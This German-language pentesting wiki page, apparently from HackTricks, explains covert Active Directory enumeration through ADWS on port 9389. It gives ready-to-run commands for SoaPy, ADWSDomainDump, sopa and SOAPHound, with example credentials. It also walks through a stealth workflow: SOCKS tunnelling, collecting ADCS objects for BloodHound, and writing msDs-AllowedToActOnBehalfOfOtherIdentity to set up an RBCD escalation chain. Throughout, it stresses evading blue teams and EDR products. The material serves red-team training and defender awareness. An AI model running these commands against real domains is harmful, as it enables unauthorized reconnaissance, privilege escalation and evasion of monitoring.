# Active Directory Web Services (ADWS) Aufzählung & verdeckte Sammlung

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **standardmäßig auf jedem Domain Controller seit Windows Server 2008 R2 aktiviert** und hört auf TCP **9389**. Trotz des Namens ist **kein HTTP beteiligt**. Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stapel proprietärer .NET-Framing-Protokolle bereit:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Weil der Verkehr in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port läuft, ist **Aufzählung über ADWS deutlich weniger wahrscheinlich, dass sie inspiziert, gefiltert oder signiert wird als klassischer LDAP/389 & 636 Verkehr**. Für Operatoren bedeutet das:

* Unauffälligere Aufklärung – Blue Teams konzentrieren sich oft auf LDAP-Abfragen.
* Freiheit, von **nicht-Windows-Hosts (Linux, macOS)** zu sammeln, indem 9389/TCP durch einen SOCKS-Proxy getunnelt wird.
* Dieselben Daten, die man über LDAP erhalten würde (Benutzer, Gruppen, ACLs, Schema, usw.), und die Möglichkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/Attribute definiert und einen `EnumerationContext`-GUID zurückgibt, gefolgt von einer oder mehreren `Pull`-Nachrichten, die bis zum serverdefinierten Ergebnisfenster streamen. Kontexte verfallen nach ~30 Minuten, daher müssen Tools entweder Ergebnisse paginieren oder Filter aufteilen (Präfixabfragen pro CN), um den Zustand nicht zu verlieren. Wenn Sicherheitsdeskriptoren angefragt werden, geben Sie die `LDAP_SERVER_SD_FLAGS_OID`-Control an, um SACLs auszuschließen; andernfalls entfernt ADWS einfach das Attribut `nTSecurityDescriptor` aus seiner SOAP-Antwort.

> HINWEIS: ADWS wird auch von vielen RSAT GUI/PowerShell-Tools verwendet, sodass der Verkehr mit legitimen Admin-Aktivitäten verschmelzen kann.

## SoaPy – nativer Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstapels in reinem Python**. Es konstruiert die NBFX/NBFSE/NNS/NMF-Frames Byte-für-Byte und ermöglicht die Sammlung von Unix-ähnlichen Systemen, ohne die .NET-Laufzeit anzutasten.

### Hauptmerkmale

* Unterstützt **Proxying über SOCKS** (nützlich für C2-Implants).
* Feinkörnige Suchfilter identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Schreibvorgänge** (`--set` / `--delete`).
* **BOFHound-Ausgabemodus** zur direkten Einspeisung in BloodHound.
* `--parse`-Flag zum Verschönern von Zeitstempeln / `userAccountControl`, wenn menschliche Lesbarkeit erforderlich ist.

### Gezielte Sammlungs-Flags & Schreiboperationen

SoaPy wird mit kuratierten Schaltern ausgeliefert, die die gängigsten LDAP-Hunting-Aufgaben über ADWS replizieren: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rohe `--query` / `--filter`-Knöpfe für benutzerdefinierte Abfragen. Kombinieren Sie diese mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (flippt `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwende denselben host/credentials, um die findings sofort zu weaponise: dump RBCD-capable objects mit `--rbcds`, und wende anschließend `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation chain vorzubereiten (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen Abuse-Pfad).

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork von `ldapdomaindump`, der LDAP queries durch ADWS calls auf TCP/9389 ersetzt, um LDAP-signature hits zu reduzieren.
* Führt eine anfängliche Erreichbarkeitsprüfung zu 9389 durch, es sei denn `--force` wird übergeben (überspringt die Probe, wenn Portscans noisy/filtered sind).
* Getestet gegen Microsoft Defender for Endpoint und CrowdStrike Falcon; erfolgreicher Bypass im README dokumentiert.

### Installation
```bash
pipx install .
```
### Verwendung
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Typische Ausgabe protokolliert den 9389-Reachability-Check, ADWS-Bind sowie Start und Ende des Dumps:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ein praktischer Client für ADWS in Golang

Ähnlich wie soapy implementiert [sopa](https://github.com/Macmod/sopa) den ADWS-Protokollstapel (MS-NNS + MC-NMF + SOAP) in Golang und bietet Kommandozeilenoptionen, um ADWS-Aufrufe wie die folgenden auszuführen:

* **Objektsuche & -abruf** - `query` / `get`
* **Objektlebenszyklus** - `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** - `attr [add|replace|delete]`
* **Kontoverwaltung** - `set-password` / `change-password`
* und andere wie `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Hochvolumige ADWS-Sammlung (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS belässt und BloodHound v4-kompatibles JSON erzeugt. Er baut einmalig einen vollständigen Cache der Attribute `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` auf (`--buildcache`) und verwendet diesen dann für hochvolumige `--bhdump`, `--certdump` (ADCS) oder `--dnsdump` (AD-integrated DNS) Durchläufe, sodass nur etwa ~35 kritische Attribute den DC verlassen. AutoSplit (`--autosplit --threshold <N>`) shardet Abfragen automatisch nach CN-Präfix, um in großen Forests unter dem 30-minütigen EnumerationContext-Timeout zu bleiben.

Typischer Arbeitsablauf auf einer in die Domäne eingebundenen Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportierte JSON-Slots direkt in SharpHound/BloodHound-Workflows—siehe [BloodHound methodology](bloodhound.md) für Ideen zur nachgelagerten Visualisierung. AutoSplit macht SOAPHound in Forests mit mehreren Millionen Objekten robust, während die Anzahl der Abfragen niedriger bleibt als bei ADExplorer-ähnlichen Snapshots.

## Stealth AD-Erfassungs-Workflow

Der folgende Workflow zeigt, wie man über ADWS **domain & ADCS objects** auflistet, sie in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffspfaden sucht – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deinem Rechner (z. B. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Sammle das Root-Domain-Objekt:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sammle ADCS-bezogene Objekte aus dem Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Die ZIP-Datei hochladen** im BloodHound GUI und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikats-Eskalationspfade (ESC1, ESC8, usw.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Tooling-Übersicht

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lesen/schreiben |
| Hochvolumiger ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS-Modi |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy/ldapsearch-Logs |
| Zertifikat-Kompromittierung | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy weitergeleitet werden |
| ADWS enumeration & Objektänderungen | [sopa](https://github.com/Macmod/sopa) | Allgemeiner Client zur Interaktion mit bekannten ADWS-Endpunkten – ermöglicht Enumeration, Objekt-Erstellung, Attributänderungen und Passwortänderungen |

## Referenzen

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
